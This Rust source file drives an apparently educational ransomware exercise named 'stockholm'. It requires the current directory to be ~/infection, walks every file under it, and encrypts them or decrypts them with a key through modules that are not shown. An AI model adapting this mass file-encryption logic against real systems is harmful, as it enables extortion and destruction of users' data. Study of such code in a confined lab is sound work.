use std::{env, path::PathBuf};
use std::error::Error;
use walkdir::WalkDir;
use crate::custom_error::CustomError;
use crate::stockholm::decryption::decrypt;
use crate::stockholm::encryption::encrypt;


fn check_dir() -> Result<(), Box<dyn Error>> {
	let home_dir = dirs::home_dir().ok_or(CustomError::NoHomeDirectory)?;
	let target_dir = home_dir.join("infection");
	let current_dir = env::current_dir()?;
	if current_dir != target_dir {
		return Err(Box::new(CustomError::WrongDirectory));
	} else {
		return Ok(());
	}
}


fn get_filenames() -> Result<Vec<PathBuf>, Box<dyn Error>> {
	let working_dir = env::current_dir()?;
	let mut filenames = Vec::new();
	for entry in WalkDir::new(working_dir).into_iter().filter_map(Result::ok) {
		if entry.file_type().is_file() {
			filenames.push(entry.path().to_path_buf());
		}
	}
	return Ok(filenames);
}


pub fn stockholm(key: &str, silent: bool, reverse: bool) -> Result<(), Box<dyn Error>> {
	check_dir()?;
	let filenames = get_filenames()?;
	if reverse == false {
		encrypt(&filenames, silent)?;
	} else {
		decrypt(key, &filenames, silent)?;
	}
	return Ok(());
}